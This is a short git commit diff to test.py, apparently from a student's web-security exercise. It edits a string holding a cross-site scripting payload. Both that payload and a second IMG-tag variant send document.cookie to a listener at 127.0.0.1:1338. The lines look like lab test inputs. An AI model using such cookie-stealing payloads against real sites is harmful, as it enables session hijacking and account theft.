14052a039e2787b643d412e2c1dd2db544ee626d
Ed Shao <ss5902@columbia.edu>
2019-11-10 18:20:07 -0500

    commit m

--- test.py
+++ test.py
@@ -1,6 +1,6 @@
 import re
 
-comment = '<script>window.open(&apos;http://127.0.0.1:1338/xss/2?cookie=&apos; + document.cookie)</script>'
+comment = '<script>window.open("http://127.0.0.1:1338/xss/2?cookie=" + document.cookie)</script>'
 comment = '<IMG SRC="javascript:window.open(&apos;http://127.0.0.1:1338/xss/2?cookie=&apos; + document.cookie);">'
 comment = ''
 print(comment)
